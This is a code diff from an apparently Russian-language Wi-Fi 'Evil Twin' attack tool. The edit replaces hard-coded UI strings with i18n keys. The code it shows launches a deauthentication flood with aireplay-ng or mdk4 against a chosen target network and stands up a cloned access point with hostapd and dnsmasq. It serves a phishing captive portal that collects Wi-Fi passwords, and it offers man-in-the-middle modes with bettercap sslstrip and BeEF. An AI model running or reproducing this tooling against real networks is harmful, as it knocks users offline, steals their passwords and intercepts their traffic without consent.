@@ -26,6 +26,7 @@ from . import iface
 from .system import missing_tools
 from .ui import ask_yes_no
 from .terminal import kill_group
+from .i18n import t
 from .netscan import scan_networks, choose_network, ask_scan_duration
 from .constants import (
     TOOLS_EVIL_TWIN, BASE_DIR, EVIL_TWIN_DIR, PORTAL_TEMPLATES_DIR,
@@ -34,13 +35,13 @@ from .constants import (
     UPSTREAM_DNS, BEEF_PORT,
 )
 
-# Режимы (ключ меню -> (id, описание, нужен ли сниффинг/интернет))
+# Режимы (ключ меню -> (id, i18n-ключ описания, нужен ли сниффинг/интернет))
 MODES = [
-    ("1", "just_ap",  "Just AP (без портала и сниффинга)", False),
-    ("2", "captive",  "Captive portal (+ проверка по handshake)", False),
-    ("3", "sniff",    "Sniffing (MITM, интернет через аплинк + bettercap)", True),
-    ("4", "sslstrip", "Sniffing + bettercap sslstrip2 (hstshijack)", True),
-    ("5", "beef",     "Sniffing + bettercap + BeEF", True),
+    ("1", "just_ap",  "et.mode_just_ap", False),
+    ("2", "captive",  "et.mode_captive", False),
+    ("3", "sniff",    "et.mode_sniff", True),
+    ("4", "sslstrip", "et.mode_sslstrip", True),
+    ("5", "beef",     "et.mode_beef", True),
 ]
 SNIFF_MODES = {"sniff", "sslstrip", "beef"}
 
@@ -74,46 +75,46 @@ def _unique_template_dir(name):
 
 
 def add_template():
-    raw = input("\nПуть к своему HTML-файлу или папке шаблона: ").strip()
+    raw = input(t("et.add_path")).strip()
     if not raw:
         return
     src = Path(raw).expanduser()
     if not src.exists():
-        print(f"[-] Не найдено: {src}")
+        print(t("et.not_found", src=src))
         return
     PORTAL_TEMPLATES_DIR.mkdir(parents=True, exist_ok=True)
-    name = input("Название шаблона (например, altel): ").strip() or src.stem
+    name = input(t("et.tpl_name")).strip() or src.stem
     dest = _unique_template_dir(name)
     try:
         if src.is_dir():
             if not (src / "index.html").exists():
-                print("[-] В папке нет index.html.")
+                print(t("et.no_index_dir"))
                 return
             shutil.copytree(src, dest)
         elif src.suffix.lower() in (".html", ".htm"):
             dest.mkdir(parents=True)
             shutil.copy2(src, dest / "index.html")
         else:
-            print("[-] Ожидается .html файл или папка с index.html.")
+            print(t("et.expect_html"))
             return
     except Exception as e:
-        print(f"[-] Не удалось добавить шаблон: {e}")
+        print(t("et.tpl_add_fail", e=e))
         return
-    print(f"[+] Шаблон добавлен: {dest.name}  ({dest})")
-    print("    Плейсхолдеры {{ESSID}}/{{ERROR}}; форма шлёт POST с полем password.")
+    print(t("et.tpl_added", name=dest.name, path=dest))
+    print(t("et.tpl_hint"))
 
 
 def choose_template():
     while True:
         templates = list_templates()
-        print("\nШаблоны портала:")
+        print(t("et.tpl_title"))
         if not templates:
-            print("  (встроенных нет — добавьте свой)")
+            print(t("et.tpl_none"))
         for i, (name, _path, source) in enumerate(templates, 1):
             print(f"  {i}. {name}  [{source}]")
-        print("  a. Добавить свой HTML/шаблон")
-        print("  0. Отмена")
-        choice = input("Выбор шаблона: ").strip().lower()
+        print(t("et.tpl_add_item"))
+        print(t("et.cancel_item"))
+        choice = input(t("et.tpl_choose")).strip().lower()
         if choice == "0":
             return None
         if choice == "a":
@@ -122,28 +123,28 @@ def choose_template():
         try:
             idx = int(choice) - 1
         except ValueError:
-            print("Неизвестный пункт.")
+            print(t("common.unknown_item"))
             continue
         if 0 <= idx < len(templates):
             return templates[idx][1]
-        print("Неизвестный пункт.")
+        print(t("common.unknown_item"))
 
 
 # ============ Выбор режима / адаптеров / метода ============
 
 def _choose_mode():
-    print("\n=== Evil Twin — выбор режима (как в airgeddon) ===")
+    print(t("et.mode_title"))
     for key, _id, desc, _sniff in MODES:
-        print(f"  {key}. {desc}")
-    print("  0. Назад")
+        print(f"  {key}. {t(desc)}")
+    print(t("et.mode_back"))
     valid = {k: i for k, i, _d, _s in MODES}
     while True:
-        c = input("Режим: ").strip()
+        c = input(t("et.mode_prompt")).strip()
         if c == "0":
             return None
         if c in valid:
             return valid[c]
-        print("Неизвестный пункт.")
+        print(t("common.unknown_item"))
 
 
 def choose_attack_adapter(ap_interface):
@@ -153,24 +154,24 @@ def choose_attack_adapter(ap_interface):
         return None
     others = [i for i in iface.list_wifi_interfaces() if i != ap_interface]
     if not others:
-        print("[-] Других Wi-Fi адаптеров не найдено.")
+        print(t("et.no_other_adapters"))
         return None
-    print("\nВыберите адаптер для атаки:")
+    print(t("et.pick_attack"))
     for i, name in enumerate(others, 1):
         mode, _ = iface.get_wifi_info(name)
         print(f"  {i}. {name}  ({mode})")
     while True:
-        choice = input("Адаптер для атаки (0 — без 2-го адаптера): ").strip()
+        choice = input(t("et.attack_prompt")).strip()
         if choice == "0":
             return None
         try:
             idx = int(choice) - 1
         except ValueError:
-            print("Введите число.")
+            print(t("et.enter_num"))
             continue
         if 0 <= idx < len(others):
             return others[idx]
-        print(f"Введите число от 1 до {len(others)}.")
+        print(t("et.num_1n", n=len(others)))
 
 
 def choose_deauth_method():
@@ -180,21 +181,21 @@ def choose_deauth_method():
         methods.append(("mdk4", "mdk4 (агрессивнее, нужен пакет mdk4)"))
     if len(methods) == 1:
         return "aireplay"
-    print("\nМетод деаутентификации:")
+    print(t("et.deauth_method_title"))
     for i, (_id, desc) in enumerate(methods, 1):
-        print(f"  {i}. {desc}")
+        print(f"  {i}. {t(desc)}")
     while True:
-        c = input("Метод (Enter = 1): ").strip()
+        c = input(t("et.method_prompt")).strip()
         if c == "":
             return methods[0][0]
         try:
             idx = int(c) - 1
         except ValueError:
-            print("Введите число.")
+            print(t("et.enter_num"))
             continue
         if 0 <= idx < len(methods):
             return methods[idx][0]
-        print("Неизвестный пункт.")
+        print(t("common.unknown_item"))
 
 
 def _default_uplink():
@@ -221,14 +222,14 @@ def choose_uplink(exclude):
             if name and name != "lo" and name not in exclude:
                 ifaces.append(name)
     if not ifaces:
-        print("[-] Не найдено интерфейса с интернетом (аплинка).")
+        print(t("et.no_uplink"))
         return None
-    print("\nИнтерфейс с интернетом (раздаётся жертве), аплинк:")
+    print(t("et.uplink_title"))
     for i, name in enumerate(ifaces, 1):
-        tag = "  <- по умолчанию" if name == default else ""
+        tag = t("et.uplink_default") if name == default else ""
         print(f"  {i}. {name}{tag}")
     while True:
-        c = input(f"Аплинк (Enter = {default or '1'}): ").strip()
+        c = input(t("et.uplink_prompt", d=default or "1")).strip()
         if c == "" and default in ifaces:
             return default
         if c == "":
@@ -236,11 +237,11 @@ def choose_uplink(exclude):
         try:
             idx = int(c) - 1
         except ValueError:
-            print("Введите число.")
+            print(t("et.enter_num"))
             continue
         if 0 <= idx < len(ifaces):
             return ifaces[idx]
-        print(f"Введите число от 1 до {len(ifaces)}.")
+        print(t("et.num_1n", n=len(ifaces)))
 
 
 # ============ Низкоуровневое ============
@@ -312,8 +313,8 @@ def _dnsmasq_conf(path, ap_iface, captive):
 def evil_twin_flow(ap_interface):
     missing = missing_tools(TOOLS_EVIL_TWIN)
     if missing:
-        print(f"[-] Не найдены утилиты: {', '.join(missing)}")
-        print("    Установите: sudo apt install hostapd dnsmasq iptables")
+        print(t("common.tools_missing", tools=", ".join(missing)))
+        print(t("et.et_install"))
         return
 
     mode = _choose_mode()
@@ -322,13 +323,13 @@ def evil_twin_flow(ap_interface):
 
     # Внешние зависимости под режим
     if mode in SNIFF_MODES and not _have("bettercap"):
-        print("[-] Для sniffing-режимов нужен bettercap: sudo apt install bettercap")
+        print(t("et.need_bettercap"))
         return
     if mode == "beef" and not (_have("beef-xss") or _have("beef")):
-        print("[-] Для BeEF нужен beef-xss: sudo apt install beef-xss")
+        print(t("et.need_beef"))
         return
 
-    print(f"\n[*] Режим: {mode}.  AP-адаптер: {ap_interface}")
+    print(t("et.mode_line", mode=mode, ap=ap_interface))
 
     # --- Скан + цель (нужен monitor) ---
     if iface.get_interface_mode(ap_interface).lower() != "monitor":
@@ -339,7 +340,7 @@ def evil_twin_flow(ap_interface):
         duration = ask_scan_duration()
         networks = scan_networks(ap_interface, duration, tmp_dir)
         if not networks:
-            print("[-] Сети не найдены.")
+            print(t("scan.none"))
             return
         target = choose_network(networks)
     finally:
@@ -352,7 +353,7 @@ def evil_twin_flow(ap_interface):
     bssid = target["bssid"]
     channel = target["channel"]
     if not essid:
-        print("[-] У сети скрытый ESSID — для двойника нужно имя.")
+        print(t("et.hidden_essid"))
         shutil.rmtree(tmp_dir, ignore_errors=True)
         return
 
@@ -362,28 +363,28 @@ def evil_twin_flow(ap_interface):
     uplink = None
 
     if mode == "captive":
-        print(f"\n[*] Выбор сайта-двойника для '{essid}'.")
+        print(t("et.choose_site", essid=essid))
         template = choose_template()
         if template is None:
-            print("[*] Отменено.")
+            print(t("common.cancelled"))
             shutil.rmtree(tmp_dir, ignore_errors=True)
             return
         if ask_yes_no("\n[?] Проверять пароль по handshake (.cap)?", default=False):
-            hs = input("Путь к .cap: ").strip()
+            hs = input(t("et.hs_path")).strip()
             if hs and Path(hs).expanduser().exists():
                 handshake = str(Path(hs).expanduser())
             else:
-                print("[!] Файл не найден — без проверки.")
+                print(t("et.hs_missing"))
 
     if mode in SNIFF_MODES:
         uplink = choose_uplink(exclude={ap_interface})
         if uplink is None:
-            print("[-] Без аплинка sniffing-режим невозможен.")
+            print(t("et.no_uplink_mode"))
             shutil.rmtree(tmp_dir, ignore_errors=True)
             return
 
     # --- Деаут ---
-    print("\n[*] Деаутентификация клиентов реальной сети.")
+    print(t("et.deauth_hdr"))
     attack_iface = choose_attack_adapter(ap_interface)
     method = choose_deauth_method()
 
@@ -409,7 +410,7 @@ def _start_attack(cfg):
     changed_forward = False
     created_vif = None
 
-    print("\n[*] Запуск Evil Twin...")
+    print(t("et.starting"))
     EVIL_TWIN_DIR.mkdir(parents=True, exist_ok=True)
 
     try:
@@ -432,7 +433,7 @@ def _start_attack(cfg):
         procs.append(("hostapd", hostapd))
         time.sleep(3)
         if hostapd.poll() is not None:
-            print("[-] hostapd не запустился. Лог:")
+            print(t("et.hostapd_fail"))
             print(_tail(tmp_dir / "hostapd.log"))
             raise RuntimeError("hostapd failed")
 
@@ -448,9 +449,9 @@ def _start_attack(cfg):
         procs.append(("dnsmasq", dnsmasq))
         time.sleep(1.5)
         if dnsmasq.poll() is not None:
-            print("[-] dnsmasq не запустился (занят порт 53?). Лог:")
+            print(t("et.dnsmasq_fail"))
             print(_tail(tmp_dir / "dnsmasq.log"))
-            print("    Освободите 53: sudo systemctl stop systemd-resolved")
+            print(t("et.free53"))
             raise RuntimeError("dnsmasq failed")
 
         # iptables + ip_forward под режим
@@ -466,9 +467,9 @@ def _start_attack(cfg):
         _watch(cfg, procs)
 
     except KeyboardInterrupt:
-        print("\n[*] Остановка Evil Twin...")
+        print(t("et.stopping"))
     except Exception as e:
-        print(f"[-] Ошибка: {e}")
+        print(t("et.error", e=e))
     finally:
         _cleanup(cfg, procs, nmcli,
                  ipt_backup if ipt_backup.exists() else None,
@@ -536,7 +537,7 @@ def _start_mode_services(cfg, procs):
         procs.append(("portal", portal))
         time.sleep(1)
         if portal.poll() is not None:
-            print(f"[-] Портал не запустился (порт {PORTAL_PORT} занят?).")
+            print(t("et.portal_fail", port=PORTAL_PORT))
             raise RuntimeError("portal failed")
         return
 
@@ -556,7 +557,7 @@ def _start_mode_services(cfg, procs):
     procs.append(("bettercap", bettercap))
     time.sleep(2)
     if bettercap.poll() is not None:
-        print("[-] bettercap не запустился. Лог:")
+        print(t("et.bettercap_fail"))
         print(_tail(tmp_dir / "bettercap.log"))
         raise RuntimeError("bettercap failed")
 
@@ -603,9 +604,9 @@ def _start_deauth(cfg, procs, tmp_dir):
         if vif:
             created_vif = vif
             deauth_iface = vif
-            print(f"[+] Монитор-интерфейс {vif} на том же адаптере.")
+            print(t("et.vif_made", vif=vif))
         else:
-            print("[!] Драйвер не поддерживает AP+monitor одновременно — нужен 2-й адаптер.")
+            print(t("et.vif_fail"))
             return None
 
     if method == "mdk4" and _have("mdk4"):
@@ -618,27 +619,28 @@ def _start_deauth(cfg, procs, tmp_dir):
         deauth = _bg(["aireplay-ng", "--deauth", "0", "-a", bssid, deauth_iface],
                      tmp_dir / "deauth.log")
     procs.append(("deauth", deauth))
-    print(f"[+] Деаутентификация ({method}) через {deauth_iface} по {bssid}.")
+    print(t("et.deauth_run", method=method, iface=deauth_iface, bssid=bssid))
     return created_vif
 
 
 def _status(cfg):
     print("\n" + "=" * 60)
-    print("  EVIL TWIN РАБОТАЕТ  (режим: %s)" % cfg["mode"])
+    print(t("et.st_running", mode=cfg["mode"]))
     print("=" * 60)
-    print(f"  Сеть-двойник : {cfg['essid']}  (канал {cfg['channel']})")
-    print(f"  Реальный BSSID: {cfg['bssid']}")
-    print(f"  AP-адаптер    : {cfg['ap_interface']}  ->  {AP_GATEWAY_IP}")
-    print(f"  Деаут         : {cfg['method']}  "
-          f"({cfg['attack_iface'] or 'монитор-VIF на том же адаптере'})")
+    print(t("et.st_twin", essid=cfg["essid"], ch=cfg["channel"]))
+    print(t("et.st_bssid", bssid=cfg["bssid"]))
+    print(t("et.st_ap", ap=cfg["ap_interface"], ip=AP_GATEWAY_IP))
+    print(t("et.st_deauth", method=cfg["method"],
+            iface=cfg["attack_iface"] or t("et.st_vif")))
     if cfg["mode"] == "captive":
-        print(f"  Портал        : {cfg['template'].name}")
-        print(f"  Проверка пароля: {'по handshake' if cfg['handshake'] else 'нет'}")
+        print(t("et.st_portal", name=cfg["template"].name))
+        print(t("et.st_check", v=t("et.st_check_hs") if cfg["handshake"]
+                               else t("et.st_check_no")))
     if cfg["mode"] in SNIFF_MODES:
-        print(f"  Аплинк (инет) : {cfg['uplink']}  (NAT)")
-        print(f"  Логи bettercap: во временной папке атаки")
+        print(t("et.st_uplink", uplink=cfg["uplink"]))
+        print(t("et.st_logs"))
     print("=" * 60)
-    print("  Ctrl+C — остановить и вернуть сеть в исходное состояние.\n")
+    print(t("et.st_stop"))
 
 
 def _watch(cfg, procs):
@@ -652,7 +654,7 @@ def _watch(cfg, procs):
         time.sleep(1)
         proc = pmap.get(key)
         if proc is not None and proc.poll() is not None:
-            print(f"[-] Процесс {key} остановился.")
+            print(t("et.proc_stopped", key=key))
             break
         if captive and PORTAL_CAPTURED_FILE.exists():
             size = PORTAL_CAPTURED_FILE.stat().st_size
@@ -669,7 +671,7 @@ def _watch(cfg, procs):
 def _cleanup(cfg, procs, nmcli, ipt_backup, changed_forward, created_vif):
     ap = cfg["ap_interface"]
     attack_iface = cfg["attack_iface"]
-    print("\n[*] Останавливаю процессы и восстанавливаю сеть...")
+    print(t("et.cleanup"))
     for _name, proc in reversed(procs):
         kill_group(proc)
 
@@ -696,19 +698,19 @@ def _cleanup(cfg, procs, nmcli, ipt_backup, changed_forward, created_vif):
     if attack_iface:
         iface.set_managed_mode(attack_iface)
 
-    print("[+] Готово, сеть восстановлена.")
+    print(t("et.cleanup_done"))
 
 
 def _show_captured():
     if not PORTAL_CAPTURED_FILE.exists():
         return
     print("\n" + "=" * 60)
-    print("  СОБРАННЫЕ ПАРОЛИ:")
+    print(t("et.captured_title"))
     print("=" * 60)
-    print(f"  Файл: {PORTAL_CAPTURED_FILE}")
+    print(t("et.captured_file", f=PORTAL_CAPTURED_FILE))
     try:
         with open(PORTAL_CAPTURED_FILE, "r", encoding="utf-8", errors="ignore") as f:
             data = f.read().strip()
-        print(data if data else "  (пусто)")
+        print(data if data else t("et.empty"))
     except Exception:
         pass
